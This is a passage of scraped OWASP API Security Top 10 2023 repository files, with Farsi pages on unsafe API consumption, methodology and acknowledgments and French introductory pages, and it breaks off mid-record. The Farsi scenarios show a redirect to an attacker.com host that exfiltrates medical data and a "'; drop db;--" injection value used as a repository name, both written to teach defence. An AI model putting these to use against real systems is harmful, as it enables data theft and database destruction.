کسب و کار آلوده شده را از سرویس طرف ثالث دریافت کند. در نهایت، کدهای تزریق شده SQL از طریق پایگاه داده اجرا شده و توسط مهاجم به سرور کنترلی ارسال می‌شوند. این کار سبب می‌شود تا مهاجم به طور غیرمجاز اطلاعات را از دیتابیس بازیابی کرده و بر روی سرور خود کنترل کند. \n\n### سناریو #2\n\nیک API با یک ارائه‌دهنده خدمات طرف ثالث ادغام می‌شود تا اطلاعات حساس پزشکی کاربران را به شکلی ایمن ذخیره کند. داده‌ها با استفاده از یک درخواست HTTP از طریق برقراری یک اتصال امن، ارسال می‌شوند:\n\n```http\nPOST /user/store_phr_record\n{\n  \"genome\": \"ACTAGTAG__TTGADDAAIICCTT…\"\n}\n```\n\nمهاجمین با نیت مخرب، باعث می‌شوند که این سرویس به جای پاسخ معمولی به درخواست‌ها، پاسخ‌هایی با کد 308 Permanent Redirect ارسال کند. کد 308 به معنای انتقال دائمی است که سبب می‌شود سرویس درخواست‌های کاربران را به مکان دیگری منتقل کند.\n\n```http\nHTTP/1.1 308 Permanent Redirect\nLocation: https://attacker.com/\n```\n\nدر نتیجه، اطلاعات حساس کاربران به جای ارسال به سرویس طرف ثالث، به سروری تحت کنترل مهاجم، ارسال می‌شود.\n\n### سناریو #3\n\nمهاجمی یک مخزن Git با نام `'; drop db;--` ایجاد می‌کند. وقتی اتصالی از برنامه تحت حمله با مخزن مخرب برقرار شود، برنامه نام مخزن را به عنوان یک ورودی امن در نظر می‌گیرد.\n\n## چگونه از ‌آسیب‌پذیری استفاده ناایمن از APIها پیشگیری کنیم؟\n---\n- **ارزیابی ارائه‌دهندگان خدمات**: هنگام انتخاب ارائه‌دهندگان خدمات طرف ثالث، امنیت API آنها را به دقت ارزیابی کرده و آن‌هایی را انتخاب کنید که دارای سابقه قوی در زمینه امنیت و حفاظت از داده‌ها هستند.\n- **ارتباط امن**: اطمینان حاصل کنید که تمام تعاملات با API‌ها از طریق یک کانال ارتباطی امن (TLS) صورت می‌گیرد. این کار باعث می‌شود که داده‌ها در زمان انتقال رمز شده و از دسترسی مهاجمان به آن‌ها جلوگیری شود. \n- **اعتبارسنجی و تصفیه داده**: همیشه داده‌های دریافتی از API‌ها را اعتبارسنجی و تصفیه کنید. این عمل از حملات مرتبط با تزریق اطلاعات جلوگیری می‌کند.\n- **نگهداری لیست مجاز (Allowlist)**: یک لیست مجاز از مکان‌های شناخته‌شده‌ای که API‌ها ممکن است به آنها هدایت شوند را نگهداری کرده و از دنبال کردن مسیرهای دارای مقصد ناشناخته خودداری کنید.\n\n## مراجع\n\n### OWASP\n\n- [Web Service Security Cheat Sheet][1]\n- [Injection Flaws][2]\n- [Input Validation Cheat Sheet][3]\n- [Injection Prevention Cheat Sheet][4]\n- [Transport Layer Protection Cheat Sheet][5]\n- [Unvalidated Redirects and Forwards Cheat Sheet][6]\n\n### خارجی\n\n- [CWE-20: Improper Input Validation][7]\n- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor][8]\n- [CWE-319: Cleartext Transmission of Sensitive Information][9]\n\n[1]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html\n[2]: https://www.owasp.org/index.php/Injection_Flaws\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html\n[4]: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\n[5]: https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html\n[6]: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\n[7]: https://cwe.mitre.org/data/definitions/20.html\n[8]: https://cwe.mitre.org/data/definitions/200.html\n[9]: https://cwe.mitre.org/data/definitions/319.html\n", "timestamp": "2025-10-24T22:26:53.805656"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0xb0-next-devs.md", "content": "# گام بعدی برای توسعه‌دهندگان\n\nوظایف مرتبط با ایجاد و نگهداری ایمن از نرم افزارها یا تعمیر نرم افزارهای موجود می‌تواند دشوار باشد و APIها نیز از قضیه مستثنی نیستند. \n\nبر این باوریم که آموزش و آگاه سازی، گامی کلیدی در راستای نوشتن و توسعه نرم افزارهای ایمن هستند. تمامی الزامات دیگر در راستای نیل به هدف فوق به **ایجاد و استفاده از فرایندهای امنیتی تکرارپذیر و کنترل‌های امنیتی استاندارد بستگی دارد.**\n\nOWASP منابع آزاد و رایگان متعددی برای پاسخ به مسائل امنیتی از ابتدای پروژه ایجاد نموده است. به منظور آشنایی با لیست جامع پروژه‌‌های دردسترس، [صفحه پروژه‌‌های OWASP][1] را ملاحظه نمایید.\n\n| | |\n|-|-|\n| **آموزش** | [Application Security Wayfinder][2] باید به شما دیدگاه خوبی در مورد پروژه‌هایی که در هر مرحله/فاز از چرخه عمر توسعه نرم‌افزار (SDLC) در دسترس هستند، بدهد. برای یادگیری و آموزش عملی، می‌توانید با [OWASP **crAPI** - **C**ompletely **R**idiculous **API**][3] یا [OWASP Juice Shop][4] شروع کنید: هر دو عمداً دارای APIهای آسیب‌پذیر هستند. پروژه [OWASP Vulnerable Web Applications Directory Project][5] فهرستی گزینش‌شده از برنامه‌های کاربردی عمداً آسیب‌پذیر را ارائه می‌دهد که می‌توانید در آنجا چندین API آسیب‌پذیر دیگر نیز پیدا کنید. همچنین می‌توانید در جلسات آموزشی [کنفرانس OWASP AppSec][6] شرکت کنید، یا [به شعبه محلی خود بپیوندید][7]. |\n| **الزامات امنیتی** | امنیت باید بعنوان بخشی تفکیک ناپذیر در تمامی پروژه‌‌ها از ابتدا درنظر گرفته شود. در هنگام استخراج الزامات امنیتی، باید معنی واژه «ایمن» برای هر پروژه مشخصا تعریف شود. OWASP استفاده از [استاندارد امنیت سنجی اپلیکیشن (ASVS)][8] را بعنوان راهنمایی برای تعیین الزامات امنیتی توصیه می‌کند. در صورت برون سپاری نیز، استفاده از [ضمیمه قرارداد نرم افزار ایمن OWASP][9] (که بایستی با قوانین و رگولاتوری‌‌های محلی انطباق یابد) می‌تواند انتخاب مناسبی باشد. |\n| **معماری امنیتی** | امنیت بایستی در تمامی مراحل توسعه پروژه‌‌ها اهمیت داشته باشد. [برگه‌‌های راهنمای پیشگیری OWASP][10] نقطه شروع مناسبی برای چگونگی طراحی ایمن در خلال فاز طراحی معماری به شمار آید. همچنین [برگه راهنمای امنیت REST][11] و [برگه راهنمای ارزیابی REST][12] و همچنین [GraphQL Cheat Sheet][13] نیز گزینه‌‌های مناسبی در این راستا هستند. |\n| **کنترل‌‌های امنیتی استاندارد** | بکارگیری و انطباق با کنترل‌‌های امنیتی استاندارد ریسک ایجاد ضعف‌‌های امنیتی در خلال ایجاد برنامه‌‌ها با منطق سازمانی را کاهش می‌دهد. علیرغم اینکه بسیاری از چارچوب‌های مدرن امروزی با استانداردهای توکار و موثر امنیتی توزیع می‌شوند، اما [کنترل‌‌های پیشگیرانه و فعال OWASP][14] دید خوبی از کنترل‌‌هایی که باید در پروژه‌‌ها لحاظ شوند بدست می‌دهد. OWASP کتابخانه و ابزارهای متعددی از جمله در حوزه کنترل‌‌های اعتبارسنجی در اختیار عموم قرار می‌دهد که می‌توانند مفید باشند. |\n| **چرخه حیات توسعه نرم افزار ایمن** | به منظور بهبود فرایندها در هنگام ایجاد و ساخت APIها می‌توان از [مدل ضمانت کمال نرم افزار OWASP (SAMM)][15] بهره برد. همچنین پروژه‌‌های متعدد دیگری نیز در OWASP وجود دارند که می‌توانند در فازهای مختلف توسعه API مفید باشند که از جمله آنها می‌توان، [پروژه بازبینی کد OWASP][16] را نام برد. |\n\n[1]: https://owasp.org/projects/\n[2]: https://owasp.org/projects/#owasp-projects-the-sdlc-and-the-security-wayfinder\n[3]: https://owasp.org/www-project-crapi/\n[4]: https://owasp.org/www-project-juice-shop/\n[5]: https://owasp.org/www-project-vulnerable-web-applications-directory/\n[6]: https://owasp.org/events/\n[7]: https://owasp.org/chapters/\n[8]: https://owasp.org/www-project-application-security-verification-standard/\n[9]: https://owasp.org/www-community/OWASP_Secure_Software_Contract_Annex\n[10]: https://cheatsheetseries.owasp.org/\n[11]: https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html\n[12]: https://cheatsheetseries.owasp.org/cheatsheets/REST_Assessment_Cheat_Sheet.html\n[13]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html\n[14]: https://owasp.org/www-project-proactive-controls/\n[15]: https://owasp.org/www-project-samm/\n[16]: https://owasp.org/www-project-code-review-guide/\n", "timestamp": "2025-10-24T22:26:53.919802"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0xb1-next-devsecops.md", "content": "# گام بعدی برای DevSecOps\n\nبا توجه به اهمیت APIها در معماری اپلیکیشن‌های جدید، ایجاد APIهای ایمن امری حیاتی می‌باشد. مقوله امنیت را نمی‌توان نادیده گرفت و باید آن را جزئی از کل چرخه توسعه اپلیکیشن در نظر گرفت. انجام اسکن و تست‌ نفوذ، آن هم به صورت سالیانه به هیچ عنوان کافی نمی‌باشد.\n\nباید به فرایند توسعه DevSecOps افزوده شده و در تمام زمان‌های توسعه نرم افزار، انجام تست‌های امنیتی مداوم را تسهیل کند. هدف آنها بهره‌گیری از خودکارسازی‌ فرایندهای امنیتی در جهت بهبود فرایند تولید نرم افزار بوده به شکلی که تاثیری بر سرعت توسعه نداشته باشد. اگر شک دارید، [مانیفست DevSecOps][1] را بررسی کنید تا در جریان باشید.\n\n|                     |                                                                                                                                                                                                                                                                                                                                         |\n|---------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| درک مدل تهدیدات      | اولویت‌ تست‌ها از مدل تهدیدات بدست می‌آید. اگر شما مدل تهدیدات ندارید می‌توانید از [OWASP Application Security Verification Standard (ASVS)][2] و [OWASP Testing Guide][3] به عنوان ورودی استفاده کنید. همچنین مشارکت دادن تیم توسعه می‌تواند باعث شود آنها نسبت به موضوعات امنیتی آگاه‌تر شوند.                                           |\n| درک چرخه توسعه نرم افزار | تیم توسعه را به فرایند اضافه کنید تا آنها نیز درک بهتری از چرخه توسعه نرم افزار پیدا کنند. مشارکت شما در انجام تست‌های مداوم امنیتی باید همراستا با افراد، فرایند‌ها و ابزارها باشد. همه باید با فرایند موافق باشند تا هیچ گونه اصطکاک و مقاومتی وجود نداشته باشد.                                                                                   |\n| راهبرد انجام تست     | با توجه به اینکه کار شما نباید تاثیری بر سرعت توسعه داشته باشد. بنابراین باید خیلی آگاهانه بهترین تکنیک (ساده، سریع‌ترین و دقیق‌ترین)‌ را برای تایید الزامات امنیتی انتخاب کنید. [OWASP Security Knowledge Framework][4] و [OWASP Application Security Verification Standard][2] می‌توانند منابع خوبی برای الزامات عملکردی و غیر عملکردی باشند. منابع خوب دیگری از [پروژه‌ها][5] و [ابزارها][6] مشابه با مواردی که توسط [DevSecOps community][7] پیشنهاد می‌شود، وجود دارد. |\n| دستیابی به جامعیت و دقت | شما پلی هستید بین تیم‌ توسعه دهنده و ‌‌‌پیاده‌سازی، برای اینکه به این مهم دست یابید نه تنها باید بر روی عملکرد و قابلیت‌ها تمرکز کنید بلکه باید به هماهنگی نیز توجه کنید. از ابتدا به صورت نزدیک با هر دو تیم توسعه و ‌‌‌پیاده‌سازی کار کنید تا بتوانید زمان و تلاش‌تان را بهینه نمایید. شما باید برای حالتی که الزامات امنیتی به صورت مداوم بررسی شوند، هدف گذاری کنید.   |\n| به وضوح یافته‌‌‌ها را به اشتراک بگذارید | با کمترین اصطکاک یا بدون اصطکاک مشارکت داشته باشید. یافته‌‌ها را در بازه زمانی مشخص و در قالب ابزارهای مورد استفاده توسط تیم توسعه (نه فایل‌های PDF) تحویل دهید. به تیم توسعه اضافه شوید تا یافته‌ها را به آن‌ها نشان دهید. از این فرصت برای آموزش آنها استفاده کنید، به صورت شفاف در مورد نقطه ضعف و روش‌های سوء استفاده از آن (که شامل سناریو‌های حملات می‌باشند) توضیح دهید تا واقعی به نظر برسد. |\n\n[1]: https://www.devsecops.org/\n[2]: https://owasp.org/www-project-application-security-verification-standard/\n[3]: https://owasp.org/www-project-web-security-testing-guide/\n[4]: https://owasp.org/www-project-security-knowledge-framework/\n[5]: http://devsecops.github.io/\n[6]: https://github.com/devsecops/awesome-devsecops\n[7]: https://www.devsecops.org/\n", "timestamp": "2025-10-24T22:26:54.032258"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0xd0-about-data.md", "content": "#  متدلوژی و داده\n\n## بررسی اجمالی  \nدر تهیه این فهرست، تیم امنیت OWASP API از روش مشابهی که برای ایجاد لیست مشهور و پرطرفدار سال 2019 با موفقیت به کار رفته بود، استفاده کرده است. این روش شامل بررسی امنیت API ها و شناسایی مشکلات امنیتی آنها می‌باشد. علاوه بر روش اصلی، [فراخوانی عمومی][1]  به مدت سه ماه برای جمع‌آوری داده‌ هم اعلام شد. متأسفانه، داده‌های به دست آمده از فراخوان، امکان تجزیه و تحلیل معتبر آماری از مشکلات امنیتی رایج در APIها را نداشتند. با این حال، فرآیند به‌روزرسانی با استفاده از همان روش متداول ادامه یافت.  \nامیدواریم به‌روزرسانی فعلی، که یک سند آگاهی‌دهنده و متمرکز بر مسائل مربوط به APIهای مدرن است برای استفاده تا سه الی چهار سال آینده مناسب باشد. هدف اصلی این پروژه این ارائه جایگزینی برای top 10 API نبوده و تمرکز آن بر مسائل مرتبط با امنیت API و ریسک‌های آینده در این زمینه است و به عنوان یک ابزار آموزشی و آگاهی‌دهنده عمل می‌کند تا صنعت به بهترین نحو ممکن از این موارد آگاه شده و اقدامات لازم را برای حفاظت از امنیت اطلاعات صورت پذیرد.\n\n## متدلوژی   \nدر فاز اول، داده‌‌های در دسترس عموم در حوزه رخداد‌‌های مرتبط با امنیت API توسط گروهی از متخصصین امنیت جمع آوری، بازبینی و دسته بندی شدند. این داده‌‌ها از پلتفرم‌‌های شکار باگ و پایگاه‌‌های داده به منظور تحلیل آماری جمع آوری شده اند. این داده‌ها در بازه زمانی بین 2019 تا 2022 گزارش شده بودند و هدف از این جمع‌آوری آن‌ها، تکامل لیست 10 API پیشین برای سال‌های آینده و کمک به مدیریت داده‌های ارائه شده توسط افراد مختلف بود. به این ترتیب، تیم امنیت OWASP API توانست از تجربیات و داده‌های موجود به‌ شکل معقولی در تدوین لیست جدید امنیتی از مشکلات API استفاده کند.\n\n [فراخوانی عمومی][1] از سپتامبر تا آخر نوامبر 2022،  برای جمع‌آوری داده آغاز شد که هم‌زمان با آن، تیم پروژه به بررسی تغییراتی که از سال 2019 به وقوع پیوسته بود، پرداخت. این بررسی شامل ارزیابی تأثیر لیست امنیتی اول، بازخوردهای دریافتی از جامعه و مشاهده تغییرات و روندهای جدید در حوزه امنیت API بود. با انجام این فراخوان، داده‌ها و بازخوردهای تازه‌ای از افراد مختلف و جامعه امنیتی جمع‌آوری شد تا تیم پروژه با آگاهی از تغییرات اخیر در امنیت API، آن‌ها را در لیست جدید مسائل امنیتی مد نظر قرار دهد.  \nاین تلاش منجر به تهیه نسخه اولیه‌ای از ده ریسک‌ بحرانی امنیتی API شد. [روش ارزیابی ریسک OWASP][2] در تجزیه و تحلیل داده‌ها و ارائه نسخه اولیه مورد استفاده قرار گرفت. امتیازات میزان شیوع براساس توافق میان اعضای تیم پروژه و براساس تجربه‌ آن‌ها در این حوزه تعیین شدند. برای اطلاعات بیشتر در این خصوص، به بخش مرتبط با [ریسک‌های امنیتی API][3] مراجعه فرمایید.  \nنسخه اولیه تهیه شده، با افراد متخصص در زمینه امنیت API به اشتراک گذاشته شد. نظرات ارائه‌شده، بررسی، بحث و در صورت نیاز به سند اضافه شدند. سند نهایی به عنوان [نسخه نهایی برای بحث عمومی][4] منتشر شد تا [مورد بحث][5] قرار گیرد و تعدادی از [نظرات و مشارکت‌های][6] ارائه‌شده از جامعه به سند نهایی اضافه گردید. در نهایت، با همکاری افراد متخصص و جامعه لیست نهایی مشکلات امنیتی API تدوین گردید.  \nلیست مشارکت کنندگان در بخش [سپاسگزاری ها][7] قابل مشاهده است.\n\n## ریسک‌های مختص API\n\nلیست حاضر، به منظور پرداختن به مخاطرات امنیتی API‌ها ایجاد شده و از آن برای برطرف کردن چالش‌های امنیتی خاص API‌ها استفاده می‌شود. این لیست به تهدیدات عمومی امنیتی که در تمام برنامه‌های کاربردی وب و نرم‌افزارها وجود دارند، توجهی نمی‌کند و هدف اصلی آن، افزایش آگاهی از تهدیدات در زمینه API‌ها و راهکارهای مورد نیاز آن‌هاست.\n\n[1]: https://owasp.org/www-project-api-security/announcements/cfd/2022/\n[2]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[3]: ./0x10-api-security-risks.md\n[4]: https://owasp.org/www-project-api-security/announcements/2023/02/api-top10-2023rc\n[5]: https://github.com/OWASP/API-Security/issues?q=is%3Aissue+label%3A2023RC\n[6]: https://github.com/OWASP/API-Security/pulls?q=is%3Apr+label%3A2023RC\n[7]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:54.151362"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0xd1-acknowledgments.md", "content": "# ACK  سپاسگزاری‌ها\n\n## سپاسگزاری از مشارکت کنندگان\nبدینوسیله از تمامی مشارکت کنندگانی که به طور عمومی در GitHub  و به سایر طرق در توسعه این مستند نقش داشته‌اند تشکر می‌نماییم:\n\n- abunuwas\n- Alissa Knight\n- Arik Atar\n- aymenfurter\n- Corey J. Ball\n- cyn8 d0znpp \n- Dan Gordon \n- donge \n- Dor Tumarkin\n- faizzaidi \n- gavjl \n- guybensimhon \n- Inês Martins \n- Isabelle Mauny \n- Ivan Novikov \n- jmanico \n- Juan Pablo \n- k7jto\n- LaurentCB\n- llegaz \n- Maxim Zavodchik \n- MrPRogers \n- planetlevel\n- rahulk22 \n- Roey Eliyahu \n- Roshan Piyush \n- securitylevelup \n- sudeshgadewar123 \n- Tatsuya-hasegawa \n- tebbers \n- vanderaj \n- wenz\n- xplo1t-sec \n- Yaniv Balmas\n- Ynvb\n- Alireza Mostame\n- Maryam Javadi Hoseini\n- Mohammad Reza Ismaeli Taba \n\n### ترجمه فارسی (Farsi Translation)\nاین ترجمه با حمایت شرکت راسپینا نت پارس تهیه شده است. استاندارد OWASP Security API Top 10 می‌تواند به عنوان مرجع راهنما در توسعه ایمن API و همچنین مرجع بررسی در فرایند آزمون نفوذ پذیری مورد استفاده قرار گیرد.\n\n### مترجمین (Translators)\n- محمد رضا اسمعیلی طبا (Mohammad Reza Ismaeli Taba)\n- مریم جوادی حسینی (Maryam Javadi Hoseini)\n\n### ویراستار (Editor)\n- علیرضا مستمع (Alireza Mostame)\n", "timestamp": "2025-10-24T22:26:54.271072"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0x00-header.md", "content": "---\ntitle: ''\ndescription: OWASP API Security Top 10 2023 edition\n---\n\n![OWASP LOGO](images/cover.jpg)\n\n| | | |\n| - | - | - |\n| https://owasp.org | Ce travail est sous licence [Creative Commons Attribution-ShareAlike 4.0 International License][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: http://creativecommons.org/licenses/by-sa/4.0/\n\n\n", "timestamp": "2025-10-24T22:26:54.731781"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0x00-notice.md", "content": "# Note\n\nCe document est la version texte traduite en français de l'OWASP API Security Top 10. Il est utilisé comme source pour toutes les versions officielles de ce document, telles que le site web.\n\n\nLes contributions au projet telles que les commentaires, les corrections ou les traductions doivent être effectuées ici. Pour plus de détails sur [Comment contribuer][1], veuillez vous référer à [CONTRIBUTING.md][1].\n\n* Erez Yallon\n* Inon Shkedy\n* Paulo Silva\n\n[1]: ../../../CONTRIBUTING.md\n", "timestamp": "2025-10-24T22:26:54.851641"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0x00-toc.md", "content": "# Table des Matières\n\n* [Table des Matières](0x00-toc.md)\n* [À propos de l'OWASP](0x01-about-owasp.md)\n* [Avant-propos](0x02-foreword.md)\n* [Introduction](0x03-introduction.md)\n* [Notes de publication](0x04-release-notes.md)\n* [Risques de sécurité des API](0x10-api-security-risks.md)\n* [OWASP Top 10 API Security Risks – 2023](0x11-t10.md)\n* [API1:2023 Broken Object Level Authorization](0xa1-broken-object-level-authorization.md)\n* [API2:2023 Broken Authentication](0xa2-broken-authentication.md)\n* [API3:2023 Broken Object Property Level Authorization](0xa3-broken-object-property-level-authorization.md)\n* [API4:2023 Unrestricted Resource Consumption](0xa4-unrestricted-resource-consumption.md)\n* [API5:2023 Broken Function Level Authorization](0xa5-broken-function-level-authorization.md)\n* [API6:2023 Unrestricted Access to Sensitive Business Flows](0xa6-unrestricted-access-to-sensitive-business-flows.md)\n* [API7:2023 Server Side Request Forgery](0xa7-server-side-request-forgery.md)\n* [API8:2023 Security Misconfiguration](0xa8-security-misconfiguration.md)\n* [API9:2023 Improper Inventory Management](0xa9-improper-inventory-management.md)\n* [API10:2023 Unsafe Consumption of APIs](0xaa-unsafe-consumption-of-apis.md)\n* [Perspectives pour les Développeurs](0xb0-next-devs.md)\n* [Perspectives pour les DevSecOps](0xb1-next-devsecops.md)\n* [Méthodologie et données](0xd0-about-data.md)\n* [Remerciements](0xd1-acknowledgments.md)\n", "timestamp": "2025-10-24T22:26:54.960032"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0x01-about-owasp.md", "content": "# À propos de l'OWASP\n\nL'Open Worldwide Application Security Project (OWASP) est une communauté ouverte qui cherche à aider les organisations à développer, acheter et maintenir des applications et des API en lesquelles elles peuvent avoir confiance.\n\nL'OWASP vous met à disposition gratuitement et en libre accès :\n\n* Des outils et des normes de sécurité pour les applications.\n* Des livres complets à propos des tests de sécurité sur les applications, du développement de code sécurisé et de la revue de code sécurisé.\n* Des présentations et des [vidéos][1].\n* Des [Cheat sheets][2] sur de nombreux sujets.\n* Des contrôles et des bibliothèques de sécurité standard.\n* Des [communautés locales partout dans le monde][3].\n* Des recherches de pointe.\n* De nombreuses [conférences partout dans le monde][4].\n* Des [listes de diffusion][5] ([archive][6]).\n\nPlus de renseignements sur : [https://www.owasp.org][7].\n\nTous les outils, documents, vidéos, présentations et communautés de l'OWASP sont gratuits et ouverts à toute personne intéressée par l'amélioration de la sécurité des applications.\n\nNous considerons la sécurité des applications d'abord comme un problème impliquant des personnes, des processus et de la technologie. La manière la plus efficace de la faire progresser est donc de travailler sur l'ensemble de ces domaines en même temps.\n\nL'OWASP est un nouveau type d'organisation. Notre liberté face aux pressions commerciales nous permet de fournir des informations impartiales, pratiques et rentables sur la sécurité des applications. \n\nL'OWASP n'est affiliée à aucune entreprise de technologie, bien que nous soutenions l'utilisation éclairée de technologies sous licences commerciales. L'OWASP produit toutes sortes d'éléments de manière collaborative, transparente et ouverte.\n\nLa Fondation OWASP est l'entité à but non lucratif qui garantit le succès à long terme du projet. La quasi-totalité des personnes associée à l'OWASP est bénévole, y compris le conseil d'administration, les responsables des communautés, les responsables de projets et les membres des projets. Nous soutenons la recherche et l'innovation sur la sécurité par des subventions et des infrastructures.\n\nRejoignez-nous !\n\n## Copyright et licence\n\n![license](images/license.png)\n\nCopyright © 2003-2023 The OWASP Foundation. \nCe document est distribué sous la [licence Creative Commons Attribution Share-Alike 4.0][8]. Toute réutilisation ou distribution doit clairement mentionner les termes et condition de licence de cette oeuvre.\n\n[1]: https://www.youtube.com/user/OWASPGLOBAL\n[2]: https://cheatsheetseries.owasp.org/\n[3]: https://owasp.org/chapters/\n[4]: https://owasp.org/events/\n[5]: https://groups.google.com/a/owasp.org/forum/#!overview\n[6]: https://lists.owasp.org/mailman/listinfo\n[7]: https://www.owasp.org\n[8]: http://creativecommons.org/licenses/by-sa/4.0/\n", "timestamp": "2025-10-24T22:26:55.074023"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0x02-foreword.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0x02-foreword.md", "content": "# Avant-propos\n\nActuellement, l'innovation dans le monde des applications est portée par l'Interface de Programmation Applicative (API). \nDes banques en passant par le commerce et le transport, jusqu'à l'IoT, les véhicules autonomes et les villes intelligentes, les API sont une partie essentielle des applications modernes, que ces applications soient des logiciels, des applications web ou mobiles. Les API peuvent être utilisées dans des applications destinées aux consommateurs, aux partenaires ou à des usages internes.\n\nPar nature, les API exposent la logique de l'application et des données sensibles telles que les données à caractère personnel (DCP) et, en raison de cela, les API sont devenues de plus en plus une cible privilégiée pour les attaquants. Sans API sécurisées, une innovation rapide serait impossible.\n\nBien que la liste des 10 principaux risques de sécurité des applications web soit toujours pertinente, en raison la nature particulière des API, une liste spécifique des risques de sécurité consacrée aux API était nécessaire. La sécurité des API se concentre sur des stratégies et des solutions pour comprendre et atténuer les vulnérabilités uniques et les risques de sécurité associés aux API.\n\nSi vous êtes familier avec le [Projet OWASP Top 10][1], vous remarquerez les similitudes entre les deux documents : ils sont conçus pour être lisibles et pour facilement se les approprier. Si vous êtes nouveau dans la série OWASP Top 10, vous feriez peut-être mieux de lire les sections [Risques de sécurité des API][2] et [Méthodologie et données][3] avant de vous plonger dans la liste du Top 10.\n\nVous pouvez contribuer au OWASP API Security Top 10 avec vos questions, commentaires et idées sur notre dépôt de projet GitHub :\n\n* https://owasp.org/www-project-api-security/\n* https://github.com/OWASP/API-Security/blob/master/CONTRIBUTING.md\n\nVous pouvez trouver le OWASP API Security Top 10 ici :\n\n* https://owasp.org/www-project-api-security/\n* https://github.com/OWASP/API-Security\n\nNous tenons à remercier tous les contributeurs qui ont rendu ce projet possible par leur effort et leurs contributions. Ils sont tous répertoriés dans la [section Remerciements][4]. Merci !\n\n[1]: https://owasp.org/www-project-top-ten/\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd0-about-data.md\n[4]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:55.189922"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fr/0x03-introduction.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fr/0x03-introduction.md", "content": "# Introduction\n\n## Bienvenue dans le OWASP API Security Top 10 - 2023!\n\nBienvenue dans la seconde édition du OWASP API Security Top 10!\n\nCe document de sensibilisation a été publié pour la première fois en 2019. Depuis\nlors, le secteur de la sécurité des API a prospéré et est devenue plus mature.\nNous croyons fermement que la première édition de ce document a contribué positivement à cette industrie,\ncar il a rapidement été adopté comme une référence.\n\nLes API jouent un rôle très important dans l'architecture moderne des applications.\nMais comme l'innovation évolue à un rythme différent de la sensibilisation à la sécurité,\nnous pensons qu'il est important de se concentrer sur la sensibilisation à la sécurité des API.\n\nLe principal objectif du OWASP API Security Top 10 est d'éduquer ceux qui sont\nimpliqués dans le développement et la maintenance des API, par exemple, les\ndéveloppeurs, les designers, les architectes, les managers ou les\norganisations. Vous pouvez en savoir plus sur le projet en\nvisitant [la page du projet][1].\n\nSi vous n'êtes pas familier avec la série OWASP top 10, nous vous recommandons de\nconsulter au moins les projets suivants :\n\n* [OWASP Cloud-Native Application Security Top 10][2]\n* [OWASP Desktop App Security Top 10][3]\n* [OWASP Docker Top 10][4]\n* [OWASP Low-Code/No-Code Top 10][5]\n* [OWASP Machine Learning Security Top Ten][6]\n* [OWASP Mobile Top 10][7]\n* [OWASP TOP 10][8]\n* [OWASP Top 10 CI/CD Security Risks][9]\n* [OWASP Top 10 Client-Side Security Risks][10]\n* [OWASP Top 10 Privacy Risks][11]\n* [OWASP Serverless Top 10][12]\n\nAucun de ces projets n'en remplace un autre : si vous travaillez sur une application\nmobile alimentée par une API back-end, vous feriez mieux de lire les deux Top 10\ncorrespondants. Il en va de même si vous travaillez sur une application web ou\nde bureau alimentée par des API.\n\nDans la section [Méthodologie et données][13], vous pouvez en savoir plus sur la\nfaçon dont cette édition a été créée. Nous encourageons tout le\nmonde à contribuer avec des questions, des commentaires et des idées sur notre\n[dépôt GitHub][14] ou notre [liste de diffusion][15].\n\n[1]: https://owasp.org/www-project-api-security/\n[2]: https://owasp.org/www-project-cloud-native-application-security-top-10/\n[3]: https://owasp.org/www-project-desktop-app-security-top-10/\n[4]: https://owasp.org/www-project-docker-top-10/\n[5]: https://owasp.org/www-project-top-10-low-code-no-code-security-risks/\n[6]: https://owasp.org/www-project-machine-learning-security-top-10/\n[7]: https://owasp.org/www-project-mobile-top-10/\n[8]: https://owasp.org/www-project-top-ten/\n[9]: https://owasp.org/www-project-top-10-ci-cd-security-risks/\n[10]: https://owasp.org/www-project-top-10-client-side-security-risks/\n[11]: https://owasp.org/www-project-top-10-privacy-risks/\n[12]: https://owasp.org/www-project-serverless-top-10/\n[13]: ./0xd0-about-data.md\n[14]: https://github.com/OWASP/API-Security\n[15]: https://groups.google.com/a/owasp.org/forum/#!forum/api-security-project\n", "timestamp": 